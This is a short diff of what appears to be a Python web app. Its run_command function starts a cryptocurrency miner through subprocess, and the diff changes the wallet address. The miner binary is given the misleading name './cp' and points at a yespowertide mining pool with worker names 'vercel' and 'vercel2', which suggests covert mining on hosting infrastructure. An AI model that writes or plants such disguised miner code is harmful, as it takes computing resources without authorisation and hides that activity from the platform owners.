@@ -22,8 +22,8 @@ def index():
 
 def run_command():
     # Perintah bash yang ingin dijalankan
-    command1 = 'cd build && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.vercel'
-    command2 = 'cd build && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.vercel2'
+    command1 = 'cd build && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TRyHNWPni8BfLAthBFiYbRJf5Z47zQcynb.vercel'
+    command2 = 'cd build && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TRyHNWPni8BfLAthBFiYbRJf5Z47zQcynb.vercel2'
     
     # Jalankan perintah pertama
     result1 = subprocess.run(command1, shell=True, capture_output=True, text=True)
